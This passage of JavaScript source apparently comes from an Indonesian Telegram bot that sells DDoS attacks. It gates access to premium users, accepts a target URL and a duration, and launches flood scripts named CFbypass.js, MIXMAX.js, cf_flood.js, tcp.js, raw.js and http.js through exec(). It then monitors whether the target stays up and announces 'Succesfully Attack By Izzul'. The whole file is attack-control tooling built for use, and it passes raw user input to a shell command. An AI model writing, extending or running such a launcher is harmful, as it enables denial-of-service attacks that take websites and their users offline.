        bot.sendMessage(chatId, `Error: ${stderr}`);
        return;
      }
      bot.sendMessage(chatId, `
  ┏━━━━━━━━━━━━━━┓
    Succesfully Attack By Izzul
    🎯 Target : ${web}
    💫 Time : ${time}
    🀄 Methods : Tls-V4
┗━━━━━━━━━━━━━━➤  `, 
      { 
      reply_markup: 
      {
       keyboard: [ 
       [
       {text: 'STOP ATTACK', callback_data: 'STOP'}
       ]
       ], resize_keyboard: true
       }
       });
       checkHost()
    });
  } else {
    bot.sendMessage(chatId, '🕊️ TARGET DAN WAKTU TIDAK VALID, SILAHKAN MASUKAN TARGET DAN WAKTU KEMBALI 🕊️\nCONTOH: https://example.com 60\n\nBOT SEDANG MELALUKAN DDOS🕊️.');
  }
}


bot.onText(/bypass/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (isPremiumUser(userId)) {
    // Premium user logic
    bot.sendMessage(chatId, '🕊️ SILAHKAN MASUKAN TARGET DAN WAKTU 🕊️\nCONTOH: https://example.com 60\n\nBOT SEDANG MELALUKAN DDOS🕊️.');
    // Menyimpan state bahwa pengguna sedang dalam proses memasukkan informasi
    bot.once('text', (msg) => handlebypasssInput(msg, chatId, userId));
  } else {
    bot.sendMessage(chatId, 'You are not a premium user.');
  }
});

async function handlebypasssInput(msg, chatId, userId) {
  const webAndTime = msg.text.split(' ');
  if (webAndTime.length === 2) {
    const web = webAndTime[0];
    const time = webAndTime[1];

    async function checkHost() {
      try {
        const chatId = msg.chat.id;
        const response = await axios.get(web);
        const status = response.status;
        const message = `Status for ${web}: ${status}`;

        const sentMessage = await bot.sendMessage(chatId, message);
      
        setTimeout(() => {
          bot.deleteMessage(chatId, sentMessage.message_id);
        }, 10000); // Contoh: Menghapus pesan setelah 5 detik
      } catch (error) {
     
        const errorMessage = `Error checking host ${web}: ${error.message}`;
    const errorSentMessage = await bot.sendMessage(chatId, errorMessage, {
      reply_markup: {
        keyboard: [
          [{ text: 'STOP ATTACK', callback_data: 'STOP' }]
        ],
        resize_keyboard: true
      }
    });

    setTimeout(() => {
      // Menghapus pesan error setelah waktu yang ditentukan
      bot.deleteMessage(chatId, errorSentMessage.message_id);
    }, 7000);

      }
    }


    const intervalId = setInterval(() => {
      checkHost();
    }, 5000); // Setiap 60 detik
    

    setTimeout(() => {
      clearInterval(intervalId);
      bot.sendMessage(chatId, `┏━━━━━━━━━━━━━━┓\nSuccesfully Attack By Izzul
    🎯 Target : ${web}
    💫 Time : ${time}
    🀄 Methods : Bypass
┗━━━━━━━━━━━━━━➤`, {reply_markup: {remove_keyboard: true}});
      bot.sendMessage(chatId, '🕊️ PERLU KEMBALI KE MENU ATAU ATTACK? 🕊️', {reply_markup: {keyboard: [[{text: 'menu', callback_data: 'menu'}, {text: 'METHODS 🔥', callback_data: 'METHODS'}]], resize_keyboard: true}})
    }, time * 1000);

    exec(`node CFbypass.js ${web} ${time}`, (error, stdout, stderr) => {
      if (error) {
        bot.sendMessage(chatId, `Error: ${error.message}`);
        return;
      }
      if (stderr) {
        bot.sendMessage(chatId, `Error: ${stderr}`);
        return;
      }
      bot.sendMessage(chatId, `
  ┏━━━━━━━━━━━━━━┓
    Succesfully Attack By Izzul
    🎯 Target : ${web}
    💫 Time : ${time}
    🀄 Methods : Bypass 
┗━━━━━━━━━━━━━━➤  `, 
      { 
      reply_markup: 
      {
       keyboard: [ 
       [
       {text: 'STOP ATTACK', callback_data: 'STOP'}
       ]
       ], resize_keyboard: true
       }
       });
       checkHost()
    });
  } else {
    bot.sendMessage(chatId, '🕊️ TARGET DAN WAKTU TIDAK VALID, SILAHKAN MASUKAN TARGET DAN WAKTU KEMBALI 🕊️\nCONTOH: https://example.com 60\n\nBOT SEDANG MELALUKAN DDOS🕊️.');
  }
}

bot.onText(/mixmax/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (isPremiumUser(userId)) {
    // Premium user logic
    bot.sendMessage(chatId, '🕊️ SILAHKAN MASUKAN TARGET DAN WAKTU 🕊️\nCONTOH: https://example.com 60\n\nBOT SEDANG MELALUKAN DDOS🕊️.');
    // Menyimpan state bahwa pengguna sedang dalam proses memasukkan informasi
    bot.once('text', (msg) => handlemixmaxxxInput(msg, chatId, userId));
  } else {
    bot.sendMessage(chatId, 'You are not a premium user.');
  }
});

async function handlemixmaxxxInput(msg, chatId, userId) {
  const webAndTime = msg.text.split(' ');
  if (webAndTime.length === 2) {
    const web = webAndTime[0];
    const time = webAndTime[1];

    async function checkHost() {
      try {
        const chatId = msg.chat.id;
        const response = await axios.get(web);
        const status = response.status;
        const message = `Status for ${web}: ${status}`;

        const sentMessage = await bot.sendMessage(chatId, message);
      
        setTimeout(() => {
          bot.deleteMessage(chatId, sentMessage.message_id);
        }, 10000); // Contoh: Menghapus pesan setelah 5 detik
      } catch (error) {
     
        const errorMessage = `Error checking host ${web}: ${error.message}`;
    const errorSentMessage = await bot.sendMessage(chatId, errorMessage, {
      reply_markup: {
        keyboard: [
          [{ text: 'STOP ATTACK', callback_data: 'STOP' }]
        ],
        resize_keyboard: true
      }
    });

    setTimeout(() => {
      // Menghapus pesan error setelah waktu yang ditentukan
      bot.deleteMessage(chatId, errorSentMessage.message_id);
    }, 7000);

      }
    }


    const intervalId = setInterval(() => {
      checkHost();
    }, 5000); // Setiap 60 detik
    

    setTimeout(() => {
      clearInterval(intervalId);
      bot.sendMessage(chatId, `┏━━━━━━━━━━━━━━┓\nSuccesfully Attack By Izzul
    🎯 Target : ${web}
    💫 Time : ${time}
    🀄 Methods : MIXMAX
┗━━━━━━━━━━━━━━➤ `, {reply_markup: {remove_keyboard: true}});
      bot.sendMessage(chatId, '🕊️ PERLU KEMBALI KE MENU ATAU ATTACK? 🕊️', {reply_markup: {keyboard: [[{text: 'menu', callback_data: 'menu'}, {text: 'METHODS 🔥', callback_data: 'METHODS'}]], resize_keyboard: true}})
    }, time * 1000);

    exec(`node MIXMAX.js ${web} ${time} 64 5`, (error, stdout, stderr) => {
      if (error) {
        bot.sendMessage(chatId, `Error: ${error.message}`);
        return;
      }
      if (stderr) {
        bot.sendMessage(chatId, `Error: ${stderr}`);
        return;
      }
      bot.sendMessage(chatId, `
  ┏━━━━━━━━━━━━━━┓
    Succesfully Attack By Izzul
    🎯 Target : ${web}
    💫 Time : ${time}
    🀄 Methods : MIXMAX 
┗━━━━━━━━━━━━━━➤  `, 
      { 
      reply_markup: 
      {
       keyboard: [ 
       [
       {text: 'STOP ATTACK', callback_data: 'STOP'}
       ]
       ], resize_keyboard: true
       }
       });
       checkHost()
    });
  } else {
    bot.sendMessage(chatId, '🕊️ TARGET DAN WAKTU TIDAK VALID, SILAHKAN MASUKAN TARGET DAN WAKTU KEMBALI 🕊️\nCONTOH: https://example.com 60\n\nBOT SEDANG MELALUKAN DDOS🕊️.');
  }
}

bot.onText(/flood/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (isPremiumUser(userId)) {
    // Premium user logic
    bot.sendMessage(chatId, '🕊️ SILAHKAN MASUKAN TARGET DAN WAKTU 🕊️\nCONTOH: https://example.com 60\n\nBOT SEDANG MELALUKAN DDOS🕊️.');
    // Menyimpan state bahwa pengguna sedang dalam proses memasukkan informasi
    bot.once('text', (msg) => handlefloodddInput(msg, chatId, userId));
  } else {
    bot.sendMessage(chatId, 'You are not a premium user.');
  }
});

async function handlefloodddInput(msg, chatId, userId) {
  const webAndTime = msg.text.split(' ');
  if (webAndTime.length === 2) {
    const web = webAndTime[0];
    const time = webAndTime[1];

    async function checkHost() {
      try {
        const chatId = msg.chat.id;
        const response = await axios.get(web);
        const status = response.status;
        const message = `Status for ${web}: ${status}`;

        const sentMessage = await bot.sendMessage(chatId, message);
      
        setTimeout(() => {
          bot.deleteMessage(chatId, sentMessage.message_id);
        }, 10000); // Contoh: Menghapus pesan setelah 5 detik
      } catch (error) {
     
        const errorMessage = `Error checking host ${web}: ${error.message}`;
    const errorSentMessage = await bot.sendMessage(chatId, errorMessage, {
      reply_markup: {
        keyboard: [
          [{ text: 'STOP ATTACK', callback_data: 'STOP' }]
        ],
        resize_keyboard: true
      }
    });

    setTimeout(() => {
      // Menghapus pesan error setelah waktu yang ditentukan
      bot.deleteMessage(chatId, errorSentMessage.message_id);
    }, 7000);

      }
    }


    const intervalId = setInterval(() => {
      checkHost();
    }, 5000); // Setiap 60 detik
    

    setTimeout(() => {
      clearInterval(intervalId);
      bot.sendMessage(chatId, `┏━━━━━━━━━━━━━━┓\nSuccesfully Attack By Izzul
    🎯 Target : ${web}
    💫 Time : ${time}
    🀄 Methods : Flood
┗━━━━━━━━━━━━━━➤`, {reply_markup: {remove_keyboard: true}});
      bot.sendMessage(chatId, '🕊️ PERLU KEMBALI KE MENU ATAU ATTACK? 🕊️', {reply_markup: {keyboard: [[{text: 'menu', callback_data: 'menu'}, {text: 'METHODS 🔥', callback_data: 'METHODS'}]], resize_keyboard: true}})
    }, time * 1000);

    exec(`node cf_flood.js ${web} ${time} 60 10 proxy.txt`, (error, stdout, stderr) => {
      if (error) {
        bot.sendMessage(chatId, `Error: ${error.message}`);
        return;
      }
      if (stderr) {
        bot.sendMessage(chatId, `Error: ${stderr}`);
        return;
      }
      bot.sendMessage(chatId, `
  ┏━━━━━━━━━━━━━━┓
    Succesfully Attack By Izzul
    🎯 Target : ${web}
    💫 Time : ${time}
    🀄 Methods : Flood 
┗━━━━━━━━━━━━━━➤ `, 
      { 
      reply_markup: 
      {
       keyboard: [ 
       [
       {text: 'STOP ATTACK', callback_data: 'STOP'}
       ]
       ], resize_keyboard: true
       }
       });
       checkHost()
    });
  } else {
    bot.sendMessage(chatId, '🕊️ TARGET DAN WAKTU TIDAK VALID, SILAHKAN MASUKAN TARGET DAN WAKTU KEMBALI 🕊️\nCONTOH: https://example.com 60\n\nBOT SEDANG MELALUKAN DDOS🕊️.');
  }
}

bot.onText(/tcp/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (isPremiumUser(userId)) {
    // Premium user logic
    bot.sendMessage(chatId, '🕊️ SILAHKAN MASUKAN TARGET DAN WAKTU 🕊️\nCONTOH: https://example.com 60\n\nBOT SEDANG MELALUKAN DDOS🕊️.');
    // Menyimpan state bahwa pengguna sedang dalam proses memasukkan informasi
    bot.once('text', (msg) => handletcpppInput(msg, chatId, userId));
  } else {
    bot.sendMessage(chatId, 'You are not a premium user.');
  }
});

async function handletcpppInput(msg, chatId, userId) {
  const webAndTime = msg.text.split(' ');
  if (webAndTime.length === 2) {
    const web = webAndTime[0];
    const time = webAndTime[1];

    async function checkHost() {
      try {
        const chatId = msg.chat.id;
        const response = await axios.get(web);
        const status = response.status;
        const message = `Status for ${web}: ${status}`;

        const sentMessage = await bot.sendMessage(chatId, message);
      
        setTimeout(() => {
          bot.deleteMessage(chatId, sentMessage.message_id);
        }, 10000); // Contoh: Menghapus pesan setelah 5 detik
      } catch (error) {
     
        const errorMessage = `Error checking host ${web}: ${error.message}`;
    const errorSentMessage = await bot.sendMessage(chatId, errorMessage, {
      reply_markup: {
        keyboard: [
          [{ text: 'STOP ATTACK', callback_data: 'STOP' }]
        ],
        resize_keyboard: true
      }
    });

    setTimeout(() => {
      // Menghapus pesan error setelah waktu yang ditentukan
      bot.deleteMessage(chatId, errorSentMessage.message_id);
    }, 7000);

      }
    }


    const intervalId = setInterval(() => {
      checkHost();
    }, 5000); // Setiap 60 detik
    

    setTimeout(() => {
      clearInterval(intervalId);
      bot.sendMessage(chatId, `┏━━━━━━━━━━━━━━┓\nSuccesfully Attack By Izzul
    🎯 Target : ${web}
    💫 Time : ${time}
    🀄 Methods : Tcp
┗━━━━━━━━━━━━━━➤`, {reply_markup: {remove_keyboard: true}});
      bot.sendMessage(chatId, '🕊️ PERLU KEMBALI KE MENU ATAU ATTACK? 🕊️', {reply_markup: {keyboard: [[{text: 'menu', callback_data: 'menu'}, {text: 'METHODS 🔥', callback_data: 'METHODS'}]], resize_keyboard: true}})
    }, time * 1000);

    exec(`node tcp.js ${web} ${time} 60 10`, (error, stdout, stderr) => {
      if (error) {
        bot.sendMessage(chatId, `Error: ${error.message}`);
        return;
      }
      if (stderr) {
        bot.sendMessage(chatId, `Error: ${stderr}`);
        return;
      }
      bot.sendMessage(chatId, `
  ┏━━━━━━━━━━━━━━┓
    Succesfully Attack By Izzul
    🎯 Target : ${web}
    💫 Time : ${time}
    🀄 Methods : Tcp 
┗━━━━━━━━━━━━━━➤ `, 
      { 
      reply_markup: 
      {
       keyboard: [ 
       [
       {text: 'STOP ATTACK', callback_data: 'STOP'}
       ]
       ], resize_keyboard: true
       }
       });
       checkHost()
    });
  } else {
    bot.sendMessage(chatId, '🕊️ TARGET DAN WAKTU TIDAK VALID, SILAHKAN MASUKAN TARGET DAN WAKTU KEMBALI 🕊️\nCONTOH: https://example.com 60\n\nBOT SEDANG MELALUKAN DDOS🕊️.');
  }
}

bot.onText(/raw/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (isPremiumUser(userId)) {
    // Premium user logic
    bot.sendMessage(chatId, 'Example web time\nCONTOH: https://example.com 60\n\nBOT BY IZZUL MODS.');
    // Menyimpan state bahwa pengguna sedang dalam proses memasukkan informasi
    bot.once('text', (msg) => handlerawwwInput(msg, chatId, userId));
  } else {
    bot.sendMessage(chatId, 'You are not a premium user.');
  }
});

async function handlerawwwInput(msg, chatId, userId) {
  const webAndTime = msg.text.split(' ');
  if (webAndTime.length === 2) {
    const web = webAndTime[0];
    const time = webAndTime[1];

    async function checkHost() {
      try {
        const chatId = msg.chat.id;
        const response = await axios.get(web);
        const status = response.status;
        const message = `Status for ${web}: ${status}`;

        const sentMessage = await bot.sendMessage(chatId, message);
      
        setTimeout(() => {
          bot.deleteMessage(chatId, sentMessage.message_id);
        }, 10000); // Contoh: Menghapus pesan setelah 5 detik
      } catch (error) {
     
        const errorMessage = `Error checking host ${web}: ${error.message}`;
    const errorSentMessage = await bot.sendMessage(chatId, errorMessage, {
      reply_markup: {
        keyboard: [
          [{ text: 'STOP ATTACK', callback_data: 'STOP' }]
        ],
        resize_keyboard: true
      }
    });

    setTimeout(() => {
      // Menghapus pesan error setelah waktu yang ditentukan
      bot.deleteMessage(chatId, errorSentMessage.message_id);
    }, 7000);

      }
    }


    const intervalId = setInterval(() => {
      checkHost();
    }, 5000); // Setiap 60 detik
    

    setTimeout(() => {
      clearInterval(intervalId);
      bot.sendMessage(chatId, `┏━━━━━━━━━━━━━━┓\nLoading Bots Are Attacking the Website
    🎯 Target : ${web}
    💫 Time : ${time}
    🀄 Methods : Raw
┗━━━━━━━━━━━━━━➤`, {reply_markup: {remove_keyboard: true}});
      bot.sendMessage(chatId, '🕊️ PERLU KEMBALI KE MENU ATAU ATTACK? 🕊️', {reply_markup: {keyboard: [[{text: 'menu', callback_data: 'menu'}, {text: 'METHODS 🔥', callback_data: 'METHODS'}]], resize_keyboard: true}})
    }, time * 1000);

    exec(`node raw.js ${web} ${time}`, (error, stdout, stderr) => {
      if (error) {
        bot.sendMessage(chatId, `Error: ${error.message}`);
        return;
      }
      if (stderr) {
        bot.sendMessage(chatId, `Error: ${stderr}`);
        return;
      }
      bot.sendMessage(chatId, `
  ┏━━━━━━━━━━━━━━┓
    Succesfully Attack By Izzul
    🎯 Target : ${web}
    💫 Time : ${time}
    🀄 Methods : Raw 
┗━━━━━━━━━━━━━━➤ `, 
      { 
      reply_markup: 
      {
       keyboard: [ 
       [
       {text: 'STOP ATTACK', callback_data: 'stop_raw'}
       ]
       ], resize_keyboard: true
       }
       });
       checkHost()
    });
  } else {
    bot.sendMessage(chatId, 'target dan waktu tidak valid, Example: web time \nExample: https://example.com 60');
  }
}

bot.onText(/http/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (isPremiumUser(userId)) {
    // Premium user logic
    bot.sendMessage(chatId, '🕊️ SILAHKAN MASUKAN TARGET DAN WAKTU 🕊️\nCONTOH: https://example.com 60\n\nBOT SEDANG MELALUKAN DDOS🕊️.');
    // Menyimpan state bahwa pengguna sedang dalam proses memasukkan informasi
    bot.once('text', (msg) => handlettpppInput(msg, chatId, userId));
  } else {
    bot.sendMessage(chatId, 'You are not a premium user.');
  }
});

async function handlettpppInput(msg, chatId, userId) {
  const webAndTime = msg.text.split(' ');
  if (webAndTime.length === 2) {
    const web = webAndTime[0];
    const time = webAndTime[1];

    async function checkHost() {
      try {
        const chatId = msg.chat.id;
        const response = await axios.get(web);
        const status = response.status;
        const message = `Status for ${web}: ${status}`;

        const sentMessage = await bot.sendMessage(chatId, message);
      
        setTimeout(() => {
          bot.deleteMessage(chatId, sentMessage.message_id);
        }, 10000); // Contoh: Menghapus pesan setelah 5 detik
      } catch (error) {
     
        const errorMessage = `Error checking host ${web}: ${error.message}`;
    const errorSentMessage = await bot.sendMessage(chatId, errorMessage, {
      reply_markup: {
        keyboard: [
          [{ text: 'STOP ATTACK', callback_data: 'STOP' }]
        ],
        resize_keyboard: true
      }
    });

    setTimeout(() => {
      // Menghapus pesan error setelah waktu yang ditentukan
      bot.deleteMessage(chatId, errorSentMessage.message_id);
    }, 7000);

      }
    }


    const intervalId = setInterval(() => {
      checkHost();
    }, 5000); // Setiap 60 detik
    

    setTimeout(() => {
      clearInterval(intervalId);
      bot.sendMessage(chatId, `┏━━━━━━━━━━━━━━┓\nSuccesfully Attack By Izzul
    🎯 Target : ${web}
    💫 Time : ${time}
    🀄 Methods : Http
┗━━━━━━━━━━━━━━➤`, {reply_markup: {remove_keyboard: true}});
      bot.sendMessage(chatId, '🕊️ PERLU KEMBALI KE MENU ATAU ATTACK? 🕊️', {reply_markup: {keyboard: [[{text: 'menu', callback_data: 'menu'}, {text: 'METHODS 🔥', callback_data: 'METHODS'}]], resize_keyboard: true}})
    }, time * 1000);

    exec(`node http.js ${web} 60 ${time}`, (error, stdout, stderr) => {
      if (error) {
        bot.sendMessage(chatId, `Error: ${error.message}`);
        return;
      }
      if (stderr) {
        bot.sendMessage(chatId, `Error: ${stderr}`);
        return;
      }
      bot.sendMessage(chatId, `┏━━━━━━━━━━━━━━┓
    Succesfully Attack By Izzul
    🎯 Target : ${web}
    💫 Time : ${time}
    🀄 Methods : Http 
┗━━━━━━━━━━━━━━➤`, 
      { 
      reply_markup: 
      {
       keyboard: [ 
       [
       {text: 'STOP ATTACK', callback_data: 'STOP'}
       ]
       ], resize_keyboard: true
       }
       });
       checkHost()
    });
  } else {
    bot.sendMessage(chatId, '🕊️ TARGET DAN WAKTU TIDAK VALID, SILAHKAN MASUKAN TARGET DAN WAKTU KEMBALI 🕊️\nCONTOH: https://example.com 60\n\nBOT SEDANG MELALUKAN DDOS🕊️.');
  }
}

  function isPremiumUser(userId) {
    // Cek apakah userId ada di dalam premiumUsers
    return premiumUsers.has(userId.toString());
  }

  // Jalankan bot
  bot.startPolling();
} catch (error) {
  console.error('Error:', error);
}
